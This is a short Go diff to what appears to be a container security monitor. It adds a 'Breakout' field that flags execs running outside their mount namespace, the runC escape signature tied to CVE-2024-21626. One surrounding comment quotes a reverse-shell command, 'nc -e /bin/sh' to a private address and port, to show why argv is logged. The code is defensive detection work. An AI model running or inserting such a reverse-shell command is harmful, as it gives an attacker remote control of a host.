@@ -207,6 +207,13 @@ type ExecInfo struct {
 	// log search, e.g. "nginx -> sh -> curl".
 	AncestryChain string `json:"ancestryChain,omitempty"`
 
+	// Breakout marks an exec whose working directory was outside the process's
+	// own mount namespace - the runC breakout signature (CVE-2024-21626 and
+	// the vulnerabilities that followed). It is set even when the exec was not
+	// denied, because the behavior is never legitimate and a report that waits
+	// for enforcement to be switched on arrives after the escape.
+	Breakout bool `json:"breakout,omitempty"`
+
 	// Args is argv as the caller passed it. It is what separates "nc ran" from
 	// "nc -e /bin/sh 10.0.0.1 4444", and it is the field an analyst reads
 	// first on a denied exec.
